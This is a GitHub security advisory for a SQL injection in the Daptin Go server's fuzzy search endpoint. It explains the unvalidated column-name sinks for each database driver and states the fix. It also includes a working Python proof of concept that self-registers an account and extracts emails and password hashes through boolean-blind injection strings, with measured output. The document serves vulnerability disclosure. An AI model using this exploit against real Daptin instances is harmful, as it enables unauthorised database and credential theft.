# [H] Daptin fuzzy search injects unvalidated column name into raw SQL

## Summary
Severity: High
Advisory: GHSA-pwqg-q8pg-pp6r
CVE: CVE-2026-44349
CWE: CWE-89
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-pwqg-q8pg-pp6r
Type: github-advisory

## Affected
- Go: `github.com/daptin/daptin` — affected >=0 <0.11.5

## Details
## Summary

`processFuzzySearch` in `server/resource/resource_findallpaginated.go:1484` splits the user-supplied `column` parameter by comma and interpolates each segment directly into `goqu.L(fmt.Sprintf("LOWER(%s) LIKE ?", prefix+col))` raw SQL with no column whitelist check. The entry point is `GET /api/<entity>` with `operator=fuzzy` (or `fuzzy_any`, `fuzzy_all`). Any authenticated user — including one who self-registered with no admin involvement — can read the entire database.

---

## Details

At `resource_findallpaginated.go:1761`, when the operator is `fuzzy`, `fuzzy_any`, or `fuzzy_all`, execution routes to `processFuzzySearch` (line 1763) before `processQueryFilter` (line 1780). `processQueryFilter` is the only path that calls `GetColumnByName` (line 1351), which validates column names against the table schema. The fuzzy branch never reaches that check.

Inside `processFuzzySearch` (line 1484), `filterQuery.ColumnName` is split by comma. After `strings.TrimSpace` (line 1486), each segment is routed to a DB-driver-specific function. The injectable sink reached depends on the driver and the `fuzzy_options.fallback_mode` field.

**SQLite** (`processFuzzySearchSQLite`, lines 1632–1676) uses `goqu.L` in all code paths — no `fallback_mode` required:
- `goqu.L(fmt.Sprintf("LOWER(%s) LIKE ?", prefix+col), ...)` — line 1650/1657

**PostgreSQL, MySQL, MSSQL** default to `goqu.Ex` (identifier-quoted, not injectable). The `goqu.L` sink is only reached when the attacker supplies a specific `fuzzy_options.fallback_mode` value in the HTTP `query` JSON:

- PostgreSQL `word_boundary` mode (line 1540): `goqu.L(fmt.Sprintf("%s ~* ?", prefix+col), ...)`
- MySQL `soundex` mode (line 1598): `goqu.L(fmt.Sprintf("SOUNDEX(%s) = SOUNDEX(?)", prefix+col), ...)`
- MSSQL `soundex` mode (line 1694): `goqu.L(fmt.Sprintf("DIFFERENCE(%s, ?) >= 3", prefix+col), ...)`

`fuzzy_options` is deserialized from the HTTP request at line 243 (`json.Unmarshal([]byte(query[0]), &queries)`) — it is fully attacker-controlled.

`goqu.L` emits its first argument as a raw SQL literal. The column position uses `%s` string formatting, not a bound parameter.

`prefix` is fixed at line 351 as `dbResource.model.GetName() + "."` — for `/api/world` this is `"world."`. Against SQLite, an attacker-supplied column value of `reference_id) OR 1=1 OR LOWER(world.reference_id` expands in the WHERE clause to `LOWER(world.reference_id) OR 1=1 OR LOWER(world.reference_id) LIKE ?`. Against PostgreSQL (where `reference_id` is stored as `bytea`), the `~*` regex operator requires a text-type column; the attack targets a `varchar` column instead (e.g., `table_name`) with an adapted injection template.

**Relation to GHSA-rw2c-8rfq-gwfv**: That patch modified `resource_aggregate.go` to fix `/aggregate/:typename`. This vulnerability is in `resource_findallpaginated.go` on the `/api/<entity>` fuzzy path — different file, different endpoint, different operator. The existing patch does not cover this path.

**Tested:** SQLite injection dynamically confirmed (boolean-blind extraction, email extracted). PostgreSQL `word_boundary` injection dynamically confirmed (baseline=0 rows, tautology=5 rows, email=`guest@cms.go` extracted via text column). MySQL and MSSQL confirmed by code review; MySQL binary panics on initialization in the test harness (unrelated daptin bug), dynamic verification not performed.

**Fix**: Add a `GetColumnByName` whitelist check in `processFuzzySearch` (line 1484) before the comma-split, matching the pattern in `processQueryFilter:1351`. All four DB driver sinks require fixing.

---

## PoC

**Environment:**

```bash
git clone https://github.com/daptin/daptin
cd daptin
git checkout 5d3214244890989eceefa694bfc976ef11458721
go build -o daptin-server .
./daptin-server   # listens on :6336, SQLite backend by default
```

**poc.py** (Python 3, no dependencies):

```python
import json, urllib.request, urllib.parse

BASE = "http://localhost:6336"

def post(path, body):
    req = urllib.request.Request(BASE + path, json.dumps(body).encode(),
                                 {"Content-Type": "application/json"})
    try:
        return json.loads(urllib.request.urlopen(req, timeout=10).read(50_000))
    except urllib.request.HTTPError as e:
        return json.loads(e.read(50_000))

def token():
    post("/action/user_account/signup", {"attributes": {
        "name": "poc", "email": "poc@test.com",
        "password": "adminadmin", "passwordConfirm": "adminadmin"}})
    body = post("/action/user_account/signin", {"attributes": {
        "email": "poc@test.com", "password": "adminadmin"}})
    return next(i["Attributes"]["value"] for i in body
                if i.get("ResponseType") == "client.store.set")

def rows(col, jwt):
    q = urllib.parse.urlencode({"query": json.dumps(
        [{"column": col, "operator": "fuzzy", "value": "zzzzz"}])})
    req = urllib.request.Request(f"{BASE}/api/world?{q}&page%5Bsize%5D=5",
                                 headers={"Authorization": "Bearer " + jwt})
    d = json.loads(urllib.request.urlopen(req, timeout=10).read(50_000))
    return len(d.get("data", []))

def oracle(expr, jwt):
    col = f"reference_id) OR ({expr}) OR LOWER(world.reference_id"
    return rows(col, jwt) > 0

def extract_int(sql, jwt, hi=200):
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"({sql}) >= {mid}", jwt): lo = mid
        else: hi = mid - 1
    return lo

def extract_str(sql, jwt, maxlen=80):
    n = extract_int(f"LENGTH(({sql}))", jwt, hi=maxlen)
    s = ""
    for _ in range(n):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            pfx = s.replace("'", "''")
            expr = f"({sql}) >= '{pfx}'||char({mid+1})" if s else f"({sql}) >= char({mid+1})"
            if oracle(expr, jwt): lo = mid + 1
            else: hi = mid
        s += chr(lo)
    return s

jwt = token()
print("baseline :", rows("reference_id", jwt), "rows")
print("tautology:", rows("reference_id) OR 1=1 OR LOWER(world.reference_id", jwt), "rows")

jwt = token()
print("sqlite_master table count:", extract_int("SELECT count(*) FROM sqlite_master WHERE type='table'", jwt, hi=80))
print("email (row 1):", extract_str("SELECT email FROM user_account ORDER BY id LIMIT 1", jwt))
pw_hex = extract_str("SELECT HEX(password) FROM user_account WHERE email='poc@test.com' LIMIT 1", jwt, maxlen=40)
print("pw hash prefix:", bytes.fromhex(pw_hex).decode("ascii", errors="replace"))
```

**Output** (measured on commit `5d32142`, SQLite, macOS arm64):

```
baseline : 0 rows
tautology: 5 rows
sqlite_master table count: 57
email (row 1): guest@cms.go
pw hash prefix: $2a$11$W7vO9oOPzpf7u
```

---

## Impact

**Attacker precondition**: One valid JWT. Self-signup is enabled by default on a fresh daptin instance — no admin involvement required.

**What is impacted**: The full database is readable via boolean-blind extraction, including all tables visible in `sqlite_master` and credential data (emails, bcrypt password hashes) in `user_account`. Extraction rate is approximately 7 HTTP requests per character, making full-database extraction feasible.

## References
- https://github.com/daptin/daptin/security/advisories/GHSA-pwqg-q8pg-pp6r
- https://nvd.nist.gov/vuln/detail/CVE-2026-44349
- https://github.com/daptin/daptin
- https://github.com/daptin/daptin/releases/tag/v0.11.5
